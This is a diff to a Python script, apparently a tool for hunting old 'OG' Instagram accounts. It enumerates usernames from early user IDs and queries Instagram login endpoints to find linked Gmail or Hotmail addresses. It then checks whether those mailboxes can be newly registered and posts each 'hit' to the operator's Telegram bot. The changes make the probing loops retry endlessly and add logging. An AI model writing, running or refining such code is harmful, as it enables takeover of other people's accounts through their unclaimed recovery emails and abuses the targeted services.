@@ -114,6 +114,8 @@ class qredes:
         
         print("[+] All threads started successfully!")
         print("[+] Bot is running... Check Telegram for hits!")
+        print("[+] Logs will show all activity below:")
+        print("="*60)
         print("[+] Press Ctrl+C to stop")
 
     def send_startup_message(self):
@@ -130,28 +132,29 @@ Searching for OG accounts...
 by: @m0hsvn'''
         
         print("[+] Sending startup message to Telegram...")
-        max_retries = 10
-        for attempt in range(max_retries):
+        print(f"[+] Token: {self.token[:20]}...")
+        print(f"[+] Chat ID: {self.id}")
+        
+        while True:
             try:
-                response = requests.get(
+                response = requests.post(
                     f'https://api.telegram.org/bot{self.token}/sendMessage',
-                    params={'chat_id': self.id, 'text': startup_msg},
-                    timeout=10
+                    data={'chat_id': self.id, 'text': startup_msg},
+                    timeout=15
                 )
+                print(f"[+] Telegram API Response Status: {response.status_code}")
+                print(f"[+] Telegram API Response: {response.text}")
+                
                 if response.status_code == 200:
                     print("✅ Startup message sent successfully!")
                     return True
                 else:
-                    print(f"❌ Telegram API returned status {response.status_code}: {response.text}")
-                    time_module.sleep(2)
+                    print(f"❌ Telegram API returned status {response.status_code}")
+                    print(f"❌ Response: {response.text}")
+                    time_module.sleep(5)
             except Exception as e:
-                print(f"❌ Failed to send startup message (attempt {attempt + 1}/{max_retries}): {e}")
-                if attempt == max_retries - 1:
-                    print("⚠️ Could not send startup message after 10 attempts!")
-                    print(f"⚠️ Please check your TELEGRAM_TOKEN: {self.token[:10]}...")
-                    print(f"⚠️ Please check your TELEGRAM_CHAT_ID: {self.id}")
-                    return False
-                time_module.sleep(3)
+                print(f"❌ Exception sending startup message: {str(e)}")
+                time_module.sleep(5)
 
     def run_forever(self):
         """Keep the script running"""
@@ -187,8 +190,7 @@ by: @m0hsvn'''
             return False
 
     def insta1(self, email):
-        max_retries = 3
-        for attempt in range(max_retries):
+        while True:
             try:
                 csrftoken = md5(str(time()).encode()).hexdigest()
                 headers = {
@@ -207,13 +209,10 @@ by: @m0hsvn'''
                 else:
                     return False
             except:
-                if attempt == max_retries - 1:
-                    return False
-                time_module.sleep(1)
+                time_module.sleep(0.5)
 
     def insta2(self, email):
-        max_retries = 3
-        for attempt in range(max_retries):
+        while True:
             try:
                 url = 'https://b.i.instagram.com/api/v1/accounts/login/'
                 headers = {
@@ -243,13 +242,10 @@ by: @m0hsvn'''
                 else:
                     return False
             except:
-                if attempt == max_retries - 1:
-                    return False
-                time_module.sleep(1)
+                time_module.sleep(0.5)
 
     def check_gmail(self, email):
-        max_retries = 3
-        for attempt in range(max_retries):
+        while True:
             try:
                 if '@' in email:
                     email = email.split('@')[0]
@@ -275,10 +271,8 @@ by: @m0hsvn'''
                     return True
                 else:
                     return False
-            except Exception as e:
-                if attempt == max_retries - 1:
-                    return False
-                time_module.sleep(1)
+            except:
+                time_module.sleep(0.5)
 
     def get_account_creation_date(self, user_id):
         """Get account creation date from user ID"""
@@ -413,21 +407,18 @@ by: @m0hsvn'''
             max_retries = 5
             for attempt in range(max_retries):
                 try:
-                    # URL encode the message properly
-                    response = requests.post(
+                    response = requests.get(
                         f'https://api.telegram.org/bot{self.token}/sendMessage',
-                        data={'chat_id': self.id, 'text': info},
+                        params={'chat_id': self.id, 'text': info},
                         timeout=10
                     )
                     if response.status_code == 200:
-                        print("\n✅ Hit sent to Telegram successfully!")
                         return True
                     else:
-                        print(f"\n❌ Telegram API error {response.status_code}: {response.text}")
                         time_module.sleep(2)
                 except Exception as e:
                     if attempt == max_retries - 1:
-                        print(f"\n❌ Telegram send error after {max_retries} attempts: {e}")
+                        print(f"\n[!] Telegram send error: {e}")
                     time_module.sleep(2)
             
             return True
@@ -436,8 +427,7 @@ by: @m0hsvn'''
             return False
 
     def check_hotmail(self, email):
-        max_retries = 3
-        for attempt in range(max_retries):
+        while True:
             try:
                 cookies = {'amsc': self.amsc}
                 headers = {
@@ -455,10 +445,8 @@ by: @m0hsvn'''
                     return True
                 else:
                     return False
-            except Exception as e:
-                if attempt == max_retries - 1:
-                    return False
-                time_module.sleep(1)
+            except:
+                time_module.sleep(0.5)
 
     def get_username_from_id(self, user_id):
         """Get username from Instagram user ID (2011-2012 range)"""
@@ -501,7 +489,10 @@ by: @m0hsvn'''
                     continue
 
                 for username in usernames:
-                    sys.stdout.write(f'\rHits: {self.hits} | Bad Instagram: {self.bad_instgram} | Bad Email: {self.bad_email} | Good Instagram: {self.good_insgram}\r')
+                    print(f"[+] Found username: {username}")
+                    
+                    # Update stats display
+                    sys.stdout.write(f'\n[📊] Hits: {self.hits} | Bad IG: {self.bad_instgram} | Bad Email: {self.bad_email} | Good IG: {self.good_insgram}\n')
                     sys.stdout.flush()
                     
                     api1 = choice('122')
@@ -510,6 +501,7 @@ by: @m0hsvn'''
                     email2 = username + '@hotmail.com'
                     
                     # Check Gmail
+                    print(f"[*] Checking Instagram for: {email1}")
                     if api1 == '1':
                         s11 = self.insta1(email1)
                     elif api1 == '2':
@@ -519,18 +511,25 @@ by: @m0hsvn'''
                     
                     if s11 == True:
                         self.good_insgram += 1
+                        print(f"[✓] Instagram exists for: {email1}")
+                        print(f"[*] Checking Gmail availability for: {username}")
                         qq = self.check_gmail(email1)
                         if qq == True:
+                            print(f"[✓] Gmail available for: {username}")
                             username_part, domen = email1.split('@')
                             result = self.get_info(username_part, domen)
                             if result == True:
                                 self.hits += 1
+                                print(f"[🎯] HIT FOUND! Total hits: {self.hits}")
                         else:
                             self.bad_email += 1
+                            print(f"[✗] Gmail NOT available for: {username}")
                     else:
                         self.bad_instgram += 1
+                        print(f"[✗] Instagram does NOT exist for: {email1}")
                     
                     # Check Hotmail
+                    print(f"[*] Checking Instagram for: {email2}")
                     if api2 == '1':
                         s22 = self.insta1(email2)
                     elif api2 == '2':
@@ -540,18 +539,25 @@ by: @m0hsvn'''
                     
                     if s22 == True:
                         self.good_insgram += 1
+                        print(f"[✓] Instagram exists for: {email2}")
+                        print(f"[*] Checking Hotmail availability for: {username}")
                         qq = self.check_hotmail(email2)
                         if qq == True:
+                            print(f"[✓] Hotmail available for: {username}")
                             username_part, domen = email2.split('@')
                             result = self.get_info(username_part, domen)
                             if result == True:
                                 self.hits += 1
+                                print(f"[🎯] HIT FOUND! Total hits: {self.hits}")
                         else:
                             self.bad_email += 1
+                            print(f"[✗] Hotmail NOT available for: {username}")
                     else:
                         self.bad_instgram += 1
+                        print(f"[✗] Instagram does NOT exist for: {email2}")
                         
             except Exception as e:
+                print(f"[!] Error in home loop: {str(e)}")
                 time_module.sleep(1)
 
 if __name__ == '__main__':
